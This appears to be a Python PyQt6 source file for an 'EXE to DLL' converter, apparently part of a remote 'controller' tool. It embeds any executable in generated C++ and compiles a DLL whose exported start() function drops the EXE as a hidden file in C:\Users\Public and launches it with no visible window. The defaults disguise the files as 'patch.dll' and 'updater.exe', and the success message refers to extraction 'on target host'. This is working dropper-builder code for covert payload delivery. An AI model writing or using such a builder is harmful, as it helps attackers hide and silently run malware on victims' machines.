import subprocess
import os
import time
import tempfile
import shutil
import threading
from PyQt6.QtWidgets import *
from PyQt6.QtCore import *
from PyQt6.QtGui import *

class ConvertDLLWorker(QThread):
    progress = pyqtSignal(str)
    finished = pyqtSignal(bool, str)
    
    def __init__(self, exe_path, output_dll_name, extract_path, dll_name):
        super().__init__()
        self.exe_path = exe_path
        self.output_dll_name = output_dll_name
        self.extract_path = extract_path
        self.dll_name = dll_name
        self._is_cancelled = False
        
    def cancel(self):
        self._is_cancelled = True
        
    def run(self):
        try:
            self.progress.emit("Reading EXE...")
            
            with open(self.exe_path, 'rb') as f:
                exe_data = f.read()
            
            self.progress.emit("Generating C++ code...")
            
            extract_path_escaped = self.extract_path.replace('\\', '\\\\')
            
            total = len(exe_data)
            
            hex_parts = []
            for i in range(0, total, 16):
                chunk = exe_data[i:i+16]
                hex_parts.append(', '.join([f'0x{b:02x}' for b in chunk]))
            
            cpp_code = '#include <windows.h>\n'
            cpp_code += '#include <stdio.h>\n\n'
            cpp_code += 'static const unsigned char embedded_exe[] = {\n'
            cpp_code += '    ' + ',\n    '.join(hex_parts) + '\n};\n'
            cpp_code += f'static const DWORD embedded_exe_size = {len(exe_data)};\n\n'
            cpp_code += 'void ExtractAndRun() {\n'
            cpp_code += '    char exePath[MAX_PATH];\n'
            cpp_code += f'    sprintf(exePath, "%s\\\\%s", "{extract_path_escaped}", "{self.dll_name}");\n\n'
            cpp_code += '    HANDLE hFile = CreateFileA(exePath, GENERIC_WRITE, 0, NULL,\n'
            cpp_code += '                                CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);\n'
            cpp_code += '    if (hFile != INVALID_HANDLE_VALUE) {\n'
            cpp_code += '        DWORD written;\n'
            cpp_code += '        WriteFile(hFile, embedded_exe, embedded_exe_size, &written, NULL);\n'
            cpp_code += '        CloseHandle(hFile);\n'
            cpp_code += '    }\n\n'
            cpp_code += '    STARTUPINFOA si;\n'
            cpp_code += '    ZeroMemory(&si, sizeof(si));\n'
            cpp_code += '    si.cb = sizeof(si);\n'
            cpp_code += '    si.dwFlags = STARTF_USESHOWWINDOW;\n'
            cpp_code += '    si.wShowWindow = SW_HIDE;\n\n'
            cpp_code += '    PROCESS_INFORMATION pi;\n'
            cpp_code += '    ZeroMemory(&pi, sizeof(pi));\n\n'
            cpp_code += '    CreateProcessA(exePath, NULL, NULL, NULL, FALSE,\n'
            cpp_code += '                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);\n\n'
            cpp_code += '    CloseHandle(pi.hProcess);\n'
            cpp_code += '    CloseHandle(pi.hThread);\n'
            cpp_code += '}\n\n'
            cpp_code += 'extern "C" __declspec(dllexport) void start() {\n'
            cpp_code += '    ExtractAndRun();\n'
            cpp_code += '}\n'
            
            temp_cpp = os.path.join(tempfile.gettempdir(), "temp_convert.cpp")
            with open(temp_cpp, 'w', encoding='utf-8') as f:
                f.write(cpp_code)
            
            self.progress.emit("Compiling DLL with MinGW...")
            
            gpp_path = shutil.which('g++')
            if not gpp_path:
                self.finished.emit(False, "MinGW (g++) not found in PATH!\n\nInstall MinGW:\nhttps://github.com/Vuniverse0/mingwInstaller/releases/download/1.2.1/mingwInstaller.exe\n\nOr add to PATH: C:\\mingw64\\bin")
                return
            
            base_dir = os.path.dirname(os.path.abspath(__file__))
            converted_dir = os.path.join(base_dir, "converted")
            os.makedirs(converted_dir, exist_ok=True)
            
            output_dll_path = os.path.join(converted_dir, self.output_dll_name)
            
            cmd = ["g++", "-shared", "-o", output_dll_path, temp_cpp,
                   "-O2", "-s", "-static-libgcc",
                   "-Wl,--subsystem,windows"]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            try:
                os.remove(temp_cpp)
            except:
                pass
            
            if result.returncode == 0 and os.path.exists(output_dll_path):
                dll_size = os.path.getsize(output_dll_path) / (1024 * 1024)
                self.progress.emit(f"Done! DLL size: {dll_size:.2f} MB")
                self.finished.emit(True, f"DLL created successfully!\n\nPath: {output_dll_path}\nSize: {dll_size:.2f} MB\nWill extract to: {self.extract_path}\\{self.dll_name} on target host")
            else:
                error_msg = result.stderr if result.stderr else "Unknown error"
                self.finished.emit(False, f"Compilation error:\n\n{error_msg[:500]}")
                
        except Exception as e:
            self.finished.emit(False, f"Error: {str(e)}")

class ConvertDLLDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Convert EXE to DLL")
        

        self.setMinimumSize(600, 520)
        self.setMaximumSize(600, 520)
        

        self.setWindowFlags(
            Qt.WindowType.Dialog | 
            Qt.WindowType.WindowTitleHint | 
            Qt.WindowType.WindowCloseButtonHint |
            Qt.WindowType.MSWindowsFixedSizeDialogHint
        )
        
        self.setModal(True)
        self.worker = None
        self.animation_timer = None
        self.dot_count = 0
        self.current_status = ""
        self.init_ui()
        
    def init_ui(self):

        layout = QVBoxLayout(self)
        layout.setSpacing(12)
        layout.setContentsMargins(20, 20, 20, 20)
        
        warning_label = QLabel(" MinGW (g++) required in PATH")
        warning_label.setStyleSheet("color: #ff4444; font-weight: bold; font-size: 11px; padding: 8px; background-color: #1a0a0a; border: 1px solid #8B0000; border-radius: 4px;")
        warning_label.setWordWrap(True)
        layout.addWidget(warning_label)
        
        hint_label = QLabel("Download: https://github.com/Vuniverse0/mingwInstaller/releases/download/1.2.1/mingwInstaller.exe | winget install -e --id GNU.Mingw | Check: g++ --version")
        hint_label.setStyleSheet("color: #888888; font-size: 9px; padding: 4px;")
        hint_label.setWordWrap(True)
        layout.addWidget(hint_label)
        
        layout.addWidget(QLabel("EXE file to convert:"))
        exe_layout = QHBoxLayout()
        self.exe_path_edit = QLineEdit()
        self.exe_path_edit.setPlaceholderText("Select EXE file...")
        exe_layout.addWidget(self.exe_path_edit)
        browse_exe_btn = QPushButton("Browse...")
        browse_exe_btn.clicked.connect(self.browse_exe)
        exe_layout.addWidget(browse_exe_btn)
        layout.addLayout(exe_layout)
        
        layout.addWidget(QLabel("Output DLL filename:"))
        self.dll_name_edit = QLineEdit()
        self.dll_name_edit.setPlaceholderText("patch.dll")
        self.dll_name_edit.setText("patch.dll")
        layout.addWidget(self.dll_name_edit)
        
        layout.addWidget(QLabel("Extract EXE to folder:"))
        extract_layout = QHBoxLayout()
        self.extract_path_edit = QLineEdit()
        self.extract_path_edit.setPlaceholderText("C:\\Users\\Public")
        self.extract_path_edit.setText("C:\\Users\\Public")
        extract_layout.addWidget(self.extract_path_edit)
        browse_folder_btn = QPushButton("Browse...")
        browse_folder_btn.clicked.connect(self.browse_folder)
        extract_layout.addWidget(browse_folder_btn)
        layout.addLayout(extract_layout)
        
        layout.addWidget(QLabel("Extracted EXE filename:"))
        self.exe_name_edit = QLineEdit()
        self.exe_name_edit.setPlaceholderText("updater.exe")
        self.exe_name_edit.setText("updater.exe")
        layout.addWidget(self.exe_name_edit)
        
        line = QFrame()
        line.setFrameShape(QFrame.Shape.HLine)
        line.setStyleSheet("background-color: #333333; max-height: 1px;")
        layout.addWidget(line)
        
        self.status_label = QLabel("Ready to convert")
        self.status_label.setStyleSheet("color: #888888; padding: 5px;")
        self.status_label.setWordWrap(True)
        layout.addWidget(self.status_label)
        
        self.progress_bar = QProgressBar()
        progress_policy = self.progress_bar.sizePolicy()
        progress_policy.setRetainSizeWhenHidden(True)
        self.progress_bar.setSizePolicy(progress_policy)
        self.progress_bar.setVisible(False)
        self.progress_bar.setRange(0, 0)
        layout.addWidget(self.progress_bar)
        
        btn_layout = QHBoxLayout()
        self.convert_btn = QPushButton("Convert to DLL")
        self.convert_btn.setStyleSheet("""
            QPushButton {
                background-color: #8B0000;
                color: white;
                font-weight: bold;
                font-size: 13px;
                padding: 10px;
            }
            QPushButton:hover {
                background-color: #6B0000;
            }
            QPushButton:disabled {
                background-color: #444444;
                color: #888888;
            }
        """)
        self.convert_btn.clicked.connect(self.start_conversion)
        btn_layout.addWidget(self.convert_btn)
        
        cancel_btn = QPushButton("Cancel")
        cancel_btn.clicked.connect(self.close)
        btn_layout.addWidget(cancel_btn)
        
        layout.addLayout(btn_layout)
        
        info_label = QLabel("Conversion may take 30-60 seconds for large files")
        info_label.setStyleSheet("color: #666666; font-size: 9px;")
        info_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(info_label)
        
        self.setFixedSize(600, 520)
        self.setMaximumSize(600, 520)
        self.setMinimumSize(600, 520)
    
    def browse_exe(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self,
            "Select EXE file",
            "",
            "Executable files (*.exe);;All files (*.*)"
        )
        if file_path:
            self.exe_path_edit.setText(file_path)
            base_name = os.path.splitext(os.path.basename(file_path))[0]
            self.dll_name_edit.setText(f"{base_name}.dll")
            self.exe_name_edit.setText(f"{base_name}_extracted.exe")
    
    def browse_folder(self):
        folder = QFileDialog.getExistingDirectory(
            self,
            "Select folder for EXE extraction"
        )
        if folder:
            self.extract_path_edit.setText(folder)
    
    def start_conversion(self):
        exe_path = self.exe_path_edit.text().strip()
        if not exe_path or not os.path.exists(exe_path):
            QMessageBox.warning(self, "Error", "Please select a valid EXE file.")
            return
        
        dll_name = self.dll_name_edit.text().strip()
        if not dll_name:
            QMessageBox.warning(self, "Error", "Please specify output DLL filename.")
            return
        if not dll_name.endswith('.dll'):
            dll_name += '.dll'
            self.dll_name_edit.setText(dll_name)
        
        extract_path = self.extract_path_edit.text().strip()
        if not extract_path:
            QMessageBox.warning(self, "Error", "Please specify extraction folder.")
            return
        if not os.path.exists(extract_path):
            reply = QMessageBox.question(
                self,
                "Folder does not exist",
                f"Folder '{extract_path}' does not exist.\nCreate it?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
            )
            if reply == QMessageBox.StandardButton.Yes:
                try:
                    os.makedirs(extract_path, exist_ok=True)
                except Exception as e:
                    QMessageBox.warning(self, "Error", f"Failed to create folder: {e}")
                    return
            else:
                return
        
        exe_name = self.exe_name_edit.text().strip()
        if not exe_name:
            QMessageBox.warning(self, "Error", "Please specify extracted EXE filename.")
            return
        if not exe_name.endswith('.exe'):
            exe_name += '.exe'
            self.exe_name_edit.setText(exe_name)
        
        gpp_path = shutil.which('g++')
        if not gpp_path:
            reply = QMessageBox.question(
                self,
                "MinGW not found",
                " g++ not found in PATH!\n\n"
                "Install MinGW:\n"
                "1. https://github.com/Vuniverse0/mingwInstaller/releases/download/1.2.1/mingwInstaller.exe\n"
                "2. Or via: winget install -e --id GNU.Mingw\n\n"
                "Restart controller after installation.\n\n"
                "Continue without g++?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
            )
            if reply != QMessageBox.StandardButton.Yes:
                return
        
        self.convert_btn.setEnabled(False)
        self.progress_bar.setVisible(True)
        self.status_label.setText("Starting conversion...")
        self.status_label.setStyleSheet("color: #ffaa00; padding: 5px;")
        self.current_status = "Starting conversion"
        
        self.animation_timer = QTimer(self)
        self.animation_timer.timeout.connect(self.animate_status)
        self.dot_count = 0
        self.animation_timer.start(500)
        
        self.worker = ConvertDLLWorker(
            exe_path=exe_path,
            output_dll_name=dll_name,
            extract_path=extract_path,
            dll_name=exe_name
        )
        self.worker.progress.connect(self.update_progress)
        self.worker.finished.connect(self.on_finished)
        self.worker.start()
    
    def animate_status(self):
        self.dot_count = (self.dot_count + 1) % 4
        dots = "." * self.dot_count
        if self.dot_count == 0:
            dots = "..."
        base = self.current_status.split(".")[0] if "." in self.current_status else self.current_status
        self.status_label.setText(f"{base}{dots}")
    
    def update_progress(self, message):
        self.current_status = message
        self.status_label.setText(message)
        self.status_label.setStyleSheet("color: #ffaa00; padding: 5px;")
    
    def on_finished(self, success, message):
        if self.animation_timer:
            self.animation_timer.stop()
            self.animation_timer = None
        
        self.progress_bar.setVisible(False)
        self.convert_btn.setEnabled(True)
        self.current_status = "Done!" if success else "Conversion failed"
        
        if success:
            self.status_label.setText(" Done!")
            self.status_label.setStyleSheet("color: #00aa00; padding: 5px;")
            QMessageBox.information(self, "Success", message)
        else:
            self.status_label.setText(" Conversion failed")
            self.status_label.setStyleSheet("color: #ff4444; padding: 5px;")
            QMessageBox.warning(self, "Error", message)
        
        self.worker = None